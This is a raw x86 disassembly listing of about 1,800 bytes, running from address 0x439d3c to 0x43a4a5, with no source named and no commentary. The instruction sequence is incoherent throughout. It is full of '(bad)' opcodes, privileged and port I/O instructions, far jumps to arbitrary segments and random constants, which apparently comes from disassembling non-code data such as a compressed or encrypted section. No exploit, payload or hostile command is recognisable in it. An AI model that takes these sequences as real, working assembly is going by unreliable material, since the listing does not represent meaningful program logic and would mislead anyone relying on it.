  439d3c:	je     0x439d85
  439d3e:	aad    0xf7
  439d40:	je     0x439da6
  439d42:	iret   
  439d43:	xchg   dh,bh
  439d45:	mov    esp,0x37c07cc7
  439d4a:	fnstenv [ebp+0x25]
  439d4d:	jg     0x439d91
  439d4f:	inc    esp
  439d50:	add    BYTE PTR [ebx],bh
  439d52:	push   edi
  439d53:	or     al,0xd8
  439d55:	not    DWORD PTR [edx]
  439d57:	clc    
  439d58:	add    ah,dl
  439d5a:	(bad)  
  439d5b:	adc    eax,DWORD PTR [eax+0x9]
  439d5e:	pop    ss
  439d5f:	clc    
  439d60:	pop    esi
  439d61:	rcl    esp,1
  439d63:	mov    ecx,DWORD PTR [ebp+0x0]
  439d66:	outs   dx,DWORD PTR ds:[esi]
  439d67:	into   
  439d68:	xchg   ebx,eax
  439d69:	cld    
  439d6a:	(bad)  
  439d6c:	adc    cl,BYTE PTR [ebx+0x3b0e4]
  439d72:	bound  ecx,QWORD PTR [eax-0x2]
  439d75:	(bad)  
  439d76:	std    
  439d77:	inc    eax
  439d78:	mov    ah,0x8a
  439d7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439d7b:	aam    0x1b
  439d7d:	or     edi,ebp
  439d7f:	cmp    edx,DWORD PTR [edx]
  439d81:	mov    ebx,DWORD PTR [edi+0x32039734]
  439d87:	mov    ebp,0x41caebb7
  439d8c:	pop    es
  439d8d:	stc    
  439d8e:	int    0x8d
  439d90:	mov    edi,0x77d033f7
  439d95:	dec    ebx
  439d96:	into   
  439d97:	or     BYTE PTR [ebx+edi*8-0x4b],dh
  439d9b:	arpl   WORD PTR [edi-0xb1a52ed],dx
  439da1:	clc    
  439da2:	das    
  439da3:	js     0x439db7
  439da5:	adc    ebp,edx
  439da7:	and    al,ah
  439da9:	jmp    eax
  439dab:	jl     0x439dae
  439dad:	mov    ebx,DWORD PTR [edi]
  439daf:	lods   al,BYTE PTR ds:[esi]
  439db0:	adc    al,0xaf
  439db2:	xchg   BYTE PTR [ebx+0x12],dl
  439db5:	pop    edx
  439db6:	stos   DWORD PTR es:[edi],eax
  439db7:	jle    0x439dc2
  439db9:	add    bl,ah
  439dbb:	push   esp
  439dbc:	mov    ch,0x3
  439dbe:	bound  eax,QWORD PTR [eax-0x7c]
  439dc1:	cmp    ebx,esi
  439dc3:	adc    al,al
  439dc5:	jmp    DWORD PTR [edx+0x6f]
  439dc8:	scas   eax,DWORD PTR es:[edi]
  439dc9:	push   ecx
  439dca:	add    BYTE PTR [ebp+0x538526b7],ch
  439dd0:	add    ecx,DWORD PTR [ecx]
  439dd2:	and    cl,BYTE PTR cs:[ecx+0x40620053]
  439dd9:	ja     0x439d67
  439ddb:	jle    0x439dfd
  439ddd:	add    eax,DWORD PTR [eax]
  439ddf:	bound  ebx,QWORD PTR [eax-0x26da7896]
  439de5:	push   ds
  439de6:	jg     0x439d8e
  439de8:	cmc    
  439de9:	cmc    
  439dea:	mov    bl,0xde
  439dec:	add    bl,BYTE PTR [ebp-0x80]
  439def:	inc    esi
  439df0:	mov    ch,0xe8
  439df2:	add    esp,DWORD PTR [edx+0x41]
  439df5:	int3   
  439df6:	adc    bl,bh
  439df8:	sub    DWORD PTR [ebx+0x58],esi
  439dfb:	ds (bad) 
  439dfd:	in     eax,0x3
  439dff:	bound  edx,QWORD PTR [eax+esi*8-0x6a]
  439e03:	dec    eax
  439e04:	pop    esp
  439e05:	es call 0xac952784
  439e0b:	push   esi
  439e0c:	xchg   ebp,eax
  439e0d:	jmp    0xea6d6aad
  439e12:	or     ebx,0xffffffc3
  439e15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439e16:	hlt    
  439e17:	jge    0x439df2
  439e19:	scas   al,BYTE PTR es:[edi]
  439e1a:	sub    ecx,DWORD PTR [ecx+ebx*1-0x50]
  439e1e:	inc    ebx
  439e1f:	mov    DWORD PTR [ecx-0x6e7e5896],0xf4e67ee9
  439e29:	cdq    
  439e2a:	add    ah,BYTE PTR [edx-0x27]
  439e2d:	cmp    DWORD PTR [edi+0x0],edi
  439e30:	push   ds
  439e31:	cmc    
  439e32:	and    eax,0x7d48701c
  439e37:	adc    cl,ch
  439e39:	pushf  
  439e3a:	mov    ebp,0x818613ab
  439e3f:	pushf  
  439e40:	fsubr  QWORD PTR [ebx]
  439e42:	sub    BYTE PTR [bx+si-0x28],0x31
  439e47:	add    esp,DWORD PTR [edx-0x51]
  439e4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439e4b:	popf   
  439e4c:	push   esi
  439e4d:	xchg   BYTE PTR [eax-0x69],ah
  439e50:	add    ecx,0x90b00c62
  439e56:	xchg   esp,eax
  439e57:	jle    0x439dff
  439e59:	std    
  439e5a:	adc    DWORD PTR [edi+ebp*8+0x256a0081],esi
  439e61:	sub    eax,esp
  439e63:	add    BYTE PTR [edx],bl
  439e65:	and    al,0xf8
  439e67:	jno    0x439e8e
  439e69:	std    
  439e6a:	psrad  mm4,QWORD PTR [esi-0x53]
  439e6e:	or     esp,DWORD PTR [edx-0x5e]
  439e71:	xor    ebp,edx
  439e73:	addr16 jb 0x439e98
  439e76:	mov    ebp,DWORD PTR [ebp+0xfbaca05]
  439e7c:	pusha  
  439e7d:	fld    DWORD PTR [eax]
  439e7f:	fs ins DWORD PTR es:[edi],dx
  439e81:	std    
  439e82:	pusha  
  439e83:	call   0xe90277e9
  439e88:	popa   
  439e89:	call   0x82aaf2d8
  439e8e:	push   esi
  439e8f:	xor    al,0xf9
  439e91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439e92:	mov    esp,0xd95a0021
  439e97:	add    BYTE PTR [ebx-0x56cc2696],ch
  439e9d:	loope  0x439ec2
  439e9f:	std    
  439ea0:	in     eax,0x2a
  439ea2:	sbb    DWORD PTR [ebx-0x15],ebp
  439ea5:	hlt    
  439ea6:	pop    ebp
  439ea7:	rcr    dl,1
  439ea9:	pop    esi
  439eaa:	(bad)  
  439eab:	rcl    BYTE PTR [ecx-0x690969cb],1
  439eb1:	lea    ebp,[edx-0x57]
  439eb4:	aad    0x29
  439eb6:	cdq    
  439eb7:	add    BYTE PTR [edx+0x53],ch
  439eba:	sub    BYTE PTR [ebp+0x5a],ch
  439ebd:	jecxz  0x439e5c
  439ebf:	sbb    al,0xd1
  439ec1:	mov    cl,0x8a
  439ec3:	push   ebx
  439ec4:	pop    esp
  439ec5:	loop   0x439ec4
  439ec7:	push   esp
  439ec8:	jmp    0x844a:0x9d89d961
  439ecf:	add    ebp,ecx
  439ed1:	popa   
  439ed2:	xor    DWORD PTR [eax-0x73dd8c88],ebx
  439ed8:	add    BYTE PTR [ebx+0x3f75fa52],ah
  439ede:	or     bh,BYTE PTR [eax+0x6ca491eb]
  439ee4:	and    al,0x13
  439ee6:	lds    esp,FWORD PTR [edi+edi*8+0x44]
  439eea:	fcom   DWORD PTR [ebx-0x75]
  439eed:	addr16 pop esp
  439eef:	(bad)  
  439ef1:	jp     0x439eec
  439ef3:	inc    esp
  439ef4:	add    al,0xfb
  439ef6:	fild   DWORD PTR [ebp+0x56]
  439ef9:	add    BYTE PTR [eax-0x32],dh
  439efc:	push   ecx
  439efd:	lea    eax,[edi-0x4fea7cf]
  439f03:	fstp   TBYTE PTR [ebp-0x26]
  439f06:	arpl   WORD PTR [edi-0x77],bx
  439f09:	inc    esp
  439f0b:	pop    eax
  439f0c:	cmp    eax,0x7d6bd724
  439f11:	(bad)  
  439f12:	inc    esi
  439f13:	test   al,0x1c
  439f15:	fs mov edx,0xc9e800db
  439f1b:	aad    0xf9
  439f1d:	inc    DWORD PTR [esi+0x20]
  439f20:	and    al,0x10
  439f22:	dec    ebx
  439f23:	inc    ebx
  439f24:	div    DWORD PTR [edx]
  439f26:	hlt    
  439f27:	outs   dx,BYTE PTR ds:[esi]
  439f28:	scas   eax,DWORD PTR es:[edi]
  439f29:	add    DWORD PTR [ebx+0x236880db],ecx
  439f2f:	pop    esp
  439f30:	cmp    eax,0x44a64a00
  439f35:	and    al,0x9f
  439f37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439f38:	je     0x439f5e
  439f3a:	stos   DWORD PTR es:[edi],eax
  439f3b:	(bad)  
  439f3c:	adc    ecx,DWORD PTR [eax]
  439f3e:	fwait
  439f3f:	sbb    edi,eax
  439f41:	test   BYTE PTR [ebx+0x3f8d1940],bh
  439f47:	xor    DWORD PTR [eax+edx*2],ecx
  439f4a:	(bad)  
  439f4b:	push   ds
  439f4c:	and    al,0x1c
  439f4e:	sbb    ebx,DWORD PTR [edx+0x4d]
  439f51:	and    al,0x62
  439f53:	aam    0x81
  439f55:	dec    esp
  439f56:	jle    0x439f80
  439f58:	sbb    al,0x8a
  439f5a:	mov    eax,ds:0x85069d
  439f5f:	mov    dh,0xdc
  439f61:	add    BYTE PTR [ebp+0x7d029c32],al
  439f67:	adc    al,0xf8
  439f69:	je     0x439fdf
  439f6b:	inc    esi
  439f6c:	and    al,0x83
  439f6e:	cli    
  439f6f:	adc    eax,0x1482954d
  439f74:	inc    ebp
  439f75:	test   eax,0xec1c867c
  439f7a:	(bad)  
  439f7b:	jbe    0x439fde
  439f7d:	add    DWORD PTR [esi+edi*1+0xc],0xbd9551b4
  439f85:	ja     0x439fab
  439f87:	xchg   BYTE PTR [ebx],dh
  439f89:	add    al,0x0
  439f8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439f8c:	mov    ah,0xe8
  439f8e:	pop    ebx
  439f8f:	popa   
  439f90:	xor    BYTE PTR [esi+edi*8],al
  439f93:	int    0x30
  439f95:	add    al,0xe8
  439f97:	jo     0x439f3b
  439f99:	pop    es
  439f9a:	stc    
  439f9b:	jmp    0xcb341a0f
  439fa0:	mov    ds:0xbbadf97f,eax
  439fa5:	push   es
  439fa6:	test   DWORD PTR [esi],ebp
  439fa8:	fdiv   st(0),st
  439faa:	xchg   BYTE PTR [esi],bl
  439fac:	adc    al,0xf8
  439fae:	jl     0x439fae
  439fb0:	sbb    ebp,DWORD PTR [edi+edi*8-0x10174b22]
  439fb7:	arpl   WORD PTR [eax],si
  439fb9:	add    al,0x50
  439fbb:	out    dx,eax
  439fbc:	in     al,dx
  439fbd:	call   0x75c42a1d
  439fc2:	sti    
  439fc3:	add    BYTE PTR [ebp-0x4b],ch
  439fc6:	push   cs
  439fc7:	je     0x43a022
  439fc9:	into   
  439fca:	lods   eax,DWORD PTR ds:[esi]
  439fcb:	mov    ch,BYTE PTR [esi+0x3da405d9]
  439fd1:	int    0x78
  439fd3:	cmovnp ebx,DWORD PTR [ebx+esi*1-0x68]
  439fd8:	arpl   WORD PTR [eax+0x1b],dx
  439fdb:	sbb    DWORD PTR [ebx+ebp*8],edi
  439fde:	ds dec ebx
  439fe0:	dec    eax
  439fe1:	fsubr  st,st(1)
  439fe3:	add    ebx,ecx
  439fe5:	pop    esp
  439fe6:	push   es
  439fe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  439fe8:	and    al,0x26
  439fea:	jmp    0x90ba:0xa9d96245
  439ff1:	and    BYTE PTR [ebx+0x45],dh
  439ff4:	stos   DWORD PTR es:[edi],eax
  439ff5:	xchg   DWORD PTR [edx+0x2a840178],esi
  439ffb:	mov    bh,0xe6
  439ffd:	xor    al,0x99
  439fff:	rcr    BYTE PTR [edi+ecx*4],1
  43a002:	fs mov bh,0xe9
  43a005:	xchg   edi,eax
  43a006:	add    DWORD PTR [edi],esp
  43a008:	call   0xa2ca8732
  43a00d:	lods   al,BYTE PTR ds:[esi]
  43a00e:	cli    
  43a00f:	sbb    BYTE PTR [ecx+0x25],0xde
  43a013:	xchg   esi,eax
  43a014:	pop    eax
  43a015:	push   edx
  43a016:	sbb    bh,BYTE PTR [ecx-0x66]
  43a019:	xor    BYTE PTR [ebx],dl
  43a01b:	xchg   DWORD PTR [ebx-0x40ba8cdb],edi
  43a021:	iret   
  43a022:	jb     0x43a05f
  43a024:	mov    edx,0xc64e8
  43a029:	stos   DWORD PTR es:[edi],eax
  43a02a:	jmp    0x19e84dd8
  43a02f:	xor    eax,0x2f878679
  43a034:	mov    ch,0x7
  43a036:	(bad)  [edx+0xa]
  43a039:	(bad)  [ebx+0x7585aa85]
  43a03f:	or     BYTE PTR [ebx+edi*2],0x51
  43a043:	jp     0x439fcb
  43a045:	jo     0x439ff3
  43a047:	add    ch,cl
  43a049:	jmp    0x6d24:0xa377f489
  43a050:	add    eax,0x380535e3
  43a055:	imul   edx,DWORD PTR [ebx-0x70b33cb2],0xffffff8b
  43a05c:	push   ds
  43a05d:	pop    ecx
  43a05e:	mov    cl,0x6c
  43a060:	inc    edi
  43a061:	pop    si
  43a063:	(bad)  
  43a064:	push   ecx
  43a065:	push   ebx
  43a066:	pop    ebp
  43a067:	clc    
  43a068:	ss xchg ecx,eax
  43a06a:	and    al,0xeb
  43a06c:	loopne 0x43a008
  43a06e:	psubsw mm1,QWORD PTR [esi]
  43a071:	frstor [edx]
  43a073:	clc    
  43a074:	(bad)  [ecx-0x5ddfa97e]
  43a07a:	mov    BYTE PTR [ebx-0x6c28203],cl
  43a080:	push   0xe8fed555
  43a085:	popa   
  43a086:	xchg   DWORD PTR [ebx-0x7bcb708],ecx
  43a08c:	out    dx,al
  43a08d:	add    BYTE PTR [ecx+0x5d],ch
  43a090:	rcr    DWORD PTR [edx+esi*4+0x4f],0x45
  43a095:	add    eax,0xd8dc3cce
  43a09a:	pop    eax
  43a09b:	and    al,BYTE PTR [ebp+edi*4+0xd7d4fba]
  43a0a2:	adc    al,0xd8
  43a0a4:	add    cl,ch
  43a0a6:	iret   
  43a0a7:	(bad)  
  43a0a8:	pop    edx
  43a0a9:	sbb    ebp,esi
  43a0ab:	pop    ebp
  43a0ac:	mov    ecx,0xa6f6a88f
  43a0b2:	sbb    ebx,DWORD PTR [ebp-0x23160ee4]
  43a0b8:	(bad)  
  43a0b9:	call   0x39445c1f
  43a0be:	imul   ecx,eax,0x1895005c
  43a0c4:	clc    
  43a0c5:	add    bh,0x21
  43a0c8:	pop    edx
  43a0c9:	mov    edx,esi
  43a0cb:	jb     0x43a082
  43a0cd:	push   ecx
  43a0ce:	js     0x43a13a
  43a0d0:	push   edx
  43a0d1:	push   edi
  43a0d2:	xor    DWORD PTR [ebx+ebx*2],ebp
  43a0d5:	push   ebp
  43a0d6:	push   0x8f97df4
  43a0db:	addr16 stc 
  43a0dd:	adc    eax,0x382a27
  43a0e2:	enter  0x499,0x8d
  43a0e6:	xlat   BYTE PTR ds:[ebx]
  43a0e7:	add    ecx,DWORD PTR [eax]
  43a0e9:	push   0x16
  43a0eb:	jne    0x43a0cd
  43a0ed:	add    ecx,DWORD PTR [ebp-0x30]
  43a0f0:	stc    
  43a0f1:	mov    eax,DWORD PTR [eax]
  43a0f3:	jnp    0x43a14f
  43a0f5:	repz je 0x43a105
  43a0f8:	mov    ds:0x130b243c,eax
  43a0fd:	ret    
  43a0fe:	pinsrw mm3,WORD PTR [eax-0x312ba9b0],0x13
  43a106:	pop    esp
  43a107:	adc    eax,0x3782f818
  43a10c:	and    DWORD PTR [ebp-0x32],edi
  43a10f:	arpl   WORD PTR [ebx-0x7c],sp
  43a112:	(bad)  
  43a113:	mov    esp,0x8d5ef78a
  43a118:	jb     0x43a198
  43a11a:	ret    
  43a11b:	nop
  43a11c:	jbe    0x43a0d3
  43a11e:	push   ebp
  43a11f:	inc    eax
  43a120:	int3   
  43a121:	inc    edi
  43a122:	push   ebx
  43a123:	inc    esi
  43a124:	in     eax,0x73
  43a126:	cmovp  ecx,DWORD PTR [esi+eax*8]
  43a12a:	mov    ecx,0xd803
  43a12f:	mov    ds:0xbcfff4a9,eax
  43a134:	ret    0x8d29
  43a137:	inc    esi
  43a138:	rcl    DWORD PTR [eax+0x6a],1
  43a13b:	bound  esi,QWORD PTR [edx]
  43a13d:	xchg   esi,eax
  43a13e:	inc    BYTE PTR [ebp+0x75fa4a67]
  43a144:	mov    ah,0x43
  43a146:	jae    0x43a1ae
  43a148:	pusha  
  43a149:	inc    esp
  43a14a:	in     eax,0x48
  43a14c:	mov    bh,0xb0
  43a14e:	sti    
  43a14f:	mov    dl,0xe9
  43a151:	cmp    eax,DWORD PTR [eax]
  43a153:	bound  esi,QWORD PTR [eax]
  43a155:	sbb    al,0x6f
  43a157:	add    BYTE PTR [esi-0x7c],cl
  43a15a:	or     al,BYTE PTR [ebp-0x278a7369]
  43a160:	dec    edx
  43a161:	mov    BYTE PTR [esi-0x7],bh
  43a164:	xor    eax,0x1b553ea7
  43a169:	lock mov al,0x84
  43a16c:	ss inc edx
  43a16e:	scas   eax,DWORD PTR es:[edi]
  43a16f:	push   ecx
  43a170:	mov    ch,0x16
  43a172:	fcom   DWORD PTR [ecx+esi*4-0x59]
  43a176:	add    al,0x66
  43a178:	bound  ebp,QWORD PTR [ebx+0xb]
  43a17b:	adc    edi,DWORD PTR [esi+0x22]
  43a17e:	(bad)  
  43a17f:	jmp    eax
  43a181:	cld    
  43a182:	out    dx,eax
  43a183:	mov    cl,BYTE PTR [edi-0x749e6a24]
  43a189:	enter  0xfa94,0xe5
  43a18d:	sub    esi,DWORD PTR [esi-0x10]
  43a190:	out    0x2a,eax
  43a192:	mov    BYTE PTR [ebx],al
  43a194:	nop
  43a195:	jo     0x43a1ad
  43a197:	sbb    ebx,ecx
  43a199:	std    
  43a19a:	or     BYTE PTR ds:0xbcc13ba1,dh
  43a1a0:	adc    ch,dl
  43a1a2:	mov    cl,0xf8
  43a1a4:	dec    edi
  43a1a5:	cld    
  43a1a6:	repnz aas 
  43a1a8:	bound  ebp,QWORD PTR [edi+0x7ad90c40]
  43a1ae:	adc    eax,0xa73e1ab
  43a1b3:	mov    al,0x63
  43a1b5:	fnstcw WORD PTR [esi]
  43a1b7:	stos   BYTE PTR es:[edi],al
  43a1b8:	adc    BYTE PTR ss:[ebx+0x35de00af],ch
  43a1bf:	imul   ebx,DWORD PTR [eax],0x4a
  43a1c2:	pop    esp
  43a1c3:	mov    eax,ds:0xc5af5290
  43a1c8:	mov    dl,0xd8
  43a1ca:	pushf  
  43a1cb:	xchg   ebp,eax
  43a1cc:	mov    ah,0x6a
  43a1ce:	int3   
  43a1cf:	or     eax,0x6ad99df2
  43a1d4:	inc    eax
  43a1d5:	push   sp
  43a1d7:	mov    ch,0x27
  43a1d9:	(bad)  
  43a1da:	std    
  43a1db:	push   edx
  43a1dc:	add    BYTE PTR [ecx+ebx*8-0x443bc9e6],bh
  43a1e3:	mov    al,0x1b
  43a1e5:	inc    ecx
  43a1e6:	push   ds
  43a1e7:	aas    
  43a1e8:	or     DWORD PTR ds:0x621b6b16,esp
  43a1ee:	lods   eax,DWORD PTR ds:[esi]
  43a1ef:	jecxz  0x43a1ab
  43a1f1:	xchg   ecx,eax
  43a1f2:	(bad)  
  43a1f3:	cli    
  43a1f4:	inc    ebx
  43a1f5:	xlat   BYTE PTR ds:[ebx]
  43a1f6:	scas   al,BYTE PTR es:[edi]
  43a1f7:	fisubr DWORD PTR [ebx-0x54245132]
  43a1fd:	(bad)  
  43a1fe:	push   ebp
  43a1ff:	(bad)  
  43a200:	fild   QWORD PTR [esi-0x214f5074]
  43a206:	push   ds
  43a207:	mov    ebx,0x7127e72c
  43a20c:	test   al,0x41
  43a20e:	int    0xb1
  43a210:	call   0x47eff7f
  43a215:	(bad)  
  43a216:	fldcw  WORD PTR [edi+esi*4-0x7f]
  43a21a:	int    0xd1
  43a21c:	data16 int3 
  43a21e:	and    edi,ecx
  43a220:	jg     0x43a222
  43a222:	mov    ds:0x62655dd1,al
  43a227:	fldl2t 
  43a229:	jl     0x43a1c3
  43a22b:	xor    BYTE PTR [esi+0x8],dh
  43a22e:	stos   DWORD PTR es:[edi],eax
  43a22f:	and    DWORD PTR [ecx],eax
  43a231:	fs int 0xf5
  43a234:	sbb    BYTE PTR [edx+0x59],ah
  43a237:	pop    edx
  43a238:	cmp    eax,0xbc3985cd
  43a23d:	popf   
  43a23e:	pop    edx
  43a23f:	and    BYTE PTR [ebp+eax*1-0x6674367e],cl
  43a246:	test   BYTE PTR ds:0xc649b78c,0x45
  43a24d:	jg     0x43a2a9
  43a24f:	pop    ebp
  43a250:	sar    esp,0x5e
  43a253:	push   esi
  43a254:	mov    DWORD PTR [ecx+0x66f79e57],0x528c2ece
  43a25e:	leave  
  43a25f:	jge    0x43a27d
  43a261:	or     DWORD PTR [ecx-0x46fae353],edi
  43a267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a268:	sbb    al,0x11
  43a26a:	test   eax,0xa50d1c7d
  43a26f:	sub    ebp,DWORD PTR [ebp+0x7]
  43a272:	lahf   
  43a273:	pop    esi
  43a274:	cmp    edi,ecx
  43a276:	in     al,0xda
  43a278:	inc    eax
  43a279:	loope  0x43a236
  43a27b:	pop    ds
  43a27c:	je     0x43a268
  43a27e:	and    esi,DWORD PTR [esi]
  43a280:	hlt    
  43a281:	ins    BYTE PTR es:[edi],dx
  43a282:	mov    eax,ds:0x21ba3
  43a287:	in     eax,dx
  43a288:	mov    DWORD PTR [eax+0x6],edx
  43a28b:	cld    
  43a28c:	adc    BYTE PTR [edx],0xa9
  43a28f:	popa   
  43a290:	pop    esp
  43a291:	sar    DWORD PTR [ebp-0x4f],0x53
  43a295:	inc    ebp
  43a296:	(bad)
  43a299:	enter  0x6432,0x22
  43a29d:	jle    0x43a248
  43a29f:	repz cmp DWORD PTR [ebx-0x2a],ebp
  43a2a3:	or     eax,0x96054554
  43a2a8:	cmp    ch,dh
  43a2aa:	add    BYTE PTR [eax-0x29],dh
  43a2ad:	stc    
  43a2ae:	test   bl,bh
  43a2b0:	dec    ecx
  43a2b1:	add    eax,0x24395fff
  43a2b6:	mov    ebp,DWORD PTR [edi+0x39]
  43a2b9:	sub    al,0x8b
  43a2bb:	push   edi
  43a2bc:	cmp    DWORD PTR [eax],ebx
  43a2be:	call   0x3d7637
  43a2c3:	add    ebp,ebp
  43a2c5:	mov    ecx,DWORD PTR [edi+ebx*4+0x3c]
  43a2c9:	loopne 0x43a2a8
  43a2cb:	int    0xd2
  43a2cd:	stc    
  43a2ce:	lea    esi,[edi]
  43a2d0:	cmp    DWORD PTR [eax+ebp*8],edx
  43a2d3:	cld    
  43a2d4:	int    0xf9
  43a2d6:	inc    ecx
  43a2d8:	pushf  
  43a2d9:	pop    ecx
  43a2da:	pop    esi
  43a2db:	es jae 0x43a353
  43a2de:	les    ebx,FWORD PTR [edi-0x64]
  43a2e1:	jne    0x43a2cf
  43a2e3:	ins    BYTE PTR es:[di],dx
  43a2e5:	push   ebx
  43a2e6:	push   esi
  43a2e7:	ror    bl,0x51
  43a2ea:	mov    DWORD PTR [eax],eax
  43a2ec:	out    dx,eax
  43a2ed:	call   DWORD PTR [edi]
  43a2ef:	call   0x3d7a5b
  43a2f4:	cmp    BYTE PTR [ebp+0x395f6c7f],0x83
  43a2fb:	imul   dh
  43a2fd:	and    BYTE PTR [esi-0x75],al
  43a300:	ss mov ebp,0xd854facb
  43a306:	(bad)  
  43a308:	or     ebx,esp
  43a30a:	add    BYTE PTR [ebx],dh
  43a30c:	inc    eax
  43a30d:	mov    ds:0x9d032444,al
  43a312:	push   esp
  43a313:	and    al,0xb3
  43a315:	ret    
  43a316:	test   al,0xf9
  43a318:	(bad)  
  43a319:	(bad)  
  43a31a:	jl     0x43a2dc
  43a31c:	aam    0x9f
  43a31e:	mov    cl,0x0
  43a320:	mov    ebx,0x62548bdb
  43a325:	into   
  43a326:	call   0x2d5d4aaf
  43a32b:	cmc    
  43a32c:	lods   eax,DWORD PTR ds:[esi]
  43a32d:	push   ss
  43a32e:	jnp    0x43a384
  43a330:	jle    0x43a330
  43a332:	jp     0x43a2fc
  43a334:	jmp    0xe0c5:0xeb27e0c5
  43a33b:	sub    ebx,ebx
  43a33d:	in     eax,dx
  43a33e:	loopne 0x43a36f
  43a340:	fcmovnu st,st(5)
  43a342:	loopne 0x43a377
  43a344:	mov    ah,BYTE PTR [esi]
  43a346:	mov    al,0xf9
  43a348:	jne    0x43a2ff
  43a34a:	inc    ebx
  43a34b:	or     esi,esp
  43a34d:	mov    cl,0x3
  43a34f:	add    BYTE PTR [eax],al
  43a351:	(bad)  
  43a352:	enter  0x5c74,0x86
  43a356:	or     edi,edi
  43a358:	adc    dh,BYTE PTR [edx+0x3]
  43a35b:	(bad)  
  43a35c:	(bad)  
  43a35d:	fisub  WORD PTR [eax+ebx*8+0x27]
  43a361:	mov    cl,0xa9
  43a363:	mov    bh,0x23
  43a365:	cmp    BYTE PTR [ebx+0x358ee812],0x4
  43a36c:	add    cl,bl
  43a36e:	cwde   
  43a36f:	cmp    cl,0xae
  43a372:	aas    
  43a373:	jnp    0x43a3e1
  43a375:	inc    esi
  43a376:	shl    BYTE PTR [ebx+0x27992584],1
  43a37c:	je     0x43a38a
  43a37e:	clc    
  43a37f:	jp     0x43a3d5
  43a381:	adc    BYTE PTR ds:[eax+edx*2+0x51bf5e9],dh
  43a389:	test   al,0xce
  43a38b:	inc    BYTE PTR [ebx+0x51e79d22]
  43a391:	xlat   BYTE PTR ds:[ebx]
  43a392:	ins    BYTE PTR es:[edi],dx
  43a393:	fsubr  DWORD PTR [ebx]
  43a395:	retf   0x149
  43a398:	add    BYTE PTR [edx-0x4c],ah
  43a39b:	inc    ebx
  43a39c:	je     0x43a402
  43a39e:	fldcw  WORD PTR [edi]
  43a3a0:	ds push ds
  43a3a2:	cmc    
  43a3a3:	out    dx,al
  43a3a4:	add    ah,BYTE PTR [eax]
  43a3a6:	xchg   DWORD PTR [eax+edi*4-0x7f],ebx
  43a3aa:	in     eax,dx
  43a3ab:	shl    edx,0x60
  43a3ae:	fldl2t 
  43a3b0:	js     0x43a35c
  43a3b2:	push   esp
  43a3b3:	mov    bh,0x8f
  43a3b5:	add    bh,bl
  43a3b7:	push   ebx
  43a3b8:	es loopne 0x43a42d
  43a3bb:	push   edx
  43a3bc:	ss loopne 0x43a400
  43a3bf:	push   ebp
  43a3c0:	stos   BYTE PTR es:[edi],al
  43a3c1:	nop
  43a3c2:	push   esp
  43a3c3:	push   ds
  43a3c4:	push   cs
  43a3c5:	loopne 0x43a410
  43a3c7:	push   edx
  43a3c8:	ss loopne 0x43a3fc
  43a3cb:	push   edx
  43a3cc:	xchg   ebp,eax
  43a3cd:	sbb    al,0x61
  43a3cf:	and    edi,DWORD PTR [edi+0x5]
  43a3d2:	fadd   QWORD PTR [ecx]
  43a3d4:	gs mov eax,0x3181f181
  43a3da:	xor    DWORD PTR [edi+eiz*2],ebx
  43a3dd:	ja     0x43a37d
  43a3df:	cmc    
  43a3e0:	add    DWORD PTR [ecx+ebx*1],ebx
  43a3e3:	and    DWORD PTR [edi+0x5],edx
  43a3e6:	in     al,0x19
  43a3e8:	scas   eax,DWORD PTR es:[edi]
  43a3e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a3ea:	cwde   
  43a3eb:	sub    BYTE PTR [edx+0x40],0x7e
  43a3ef:	sbb    ch,BYTE PTR [ebx+0x18]
  43a3f2:	dec    esi
  43a3f3:	mov    cl,BYTE PTR [ebp+ebp*4-0x2051ad4e]
  43a3fa:	cmp    eax,0xfd794452
  43a3ff:	push   ebx
  43a400:	pop    ds
  43a401:	mov    ebx,DWORD PTR [esi-0x7c]
  43a404:	push   ss
  43a405:	out    dx,eax
  43a406:	ins    DWORD PTR es:[edi],dx
  43a407:	retf   0x3a9
  43a40a:	fbld   TBYTE PTR [eax]
  43a40c:	pop    ebp
  43a40d:	add    eax,0x43bbd56b
  43a412:	jmp    FWORD PTR [ebx-0x35c98e]
  43a418:	add    ah,dh
  43a41a:	add    BYTE PTR [esi+0x20],bl
  43a41d:	xchg   BYTE PTR [ebp-0x4e740a53],dl
  43a423:	imul   edi,ebp,0x5466defa
  43a429:	dec    ebp
  43a42a:	or     eax,0x62dbec96
  43a42f:	imul   edx,DWORD PTR [ecx+0x55],0x4d56ae0d
  43a436:	add    eax,0xd3d5692
  43a43b:	xchg   BYTE PTR [esi+0x55],dl
  43a43e:	add    eax,0x3229357a
  43a443:	pop    esp
  43a444:	and    BYTE PTR [ebp-0x57],bh
  43a447:	in     eax,dx
  43a448:	lock jmp 0x43a43e
  43a44b:	pop    esi
  43a44c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43a44d:	sbb    al,0xbd
  43a44f:	jmp    0x7420:0x461c5012
  43a456:	jg     0x43a4be
  43a458:	push   esi
  43a459:	shl    DWORD PTR [edx-0x71],1
  43a45c:	xor    DWORD PTR [ebx],edi
  43a45e:	and    BYTE PTR [edx+eiz*1+0x7d],ah
  43a462:	sub    esp,edx
  43a464:	retf   
  43a465:	test   DWORD PTR [ebp-0x101732e3],ebp
  43a46b:	sti    
  43a46c:	and    bh,al
  43a46e:	bound  edx,QWORD PTR [ecx+0x58]
  43a471:	out    dx,eax
  43a472:	mov    esp,0x7a033676
  43a477:	pusha  
  43a478:	push   eax
  43a479:	inc    ebp
  43a47a:	or     eax,0x1432350e
  43a47f:	add    BYTE PTR [edx+eiz*1-0x75],ah
  43a483:	sub    bh,BYTE PTR [esi-0x1d3daa7e]
  43a489:	adc    eax,0x1cf92b0d
  43a48e:	cmp    ebp,0x24
  43a491:	mov    cs,WORD PTR [ebp+0x0]
  43a494:	lds    esp,FWORD PTR [ecx+0x6d8033df]
  43a49a:	mov    ecx,DWORD PTR [edi+eiz*4+0x38]
  43a49e:	jg     0x43a50c
  43a4a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43a4a1:	add    BYTE PTR [edi+0x5c],bh
  43a4a4:	push   edi
  43a4a5:	cmc    
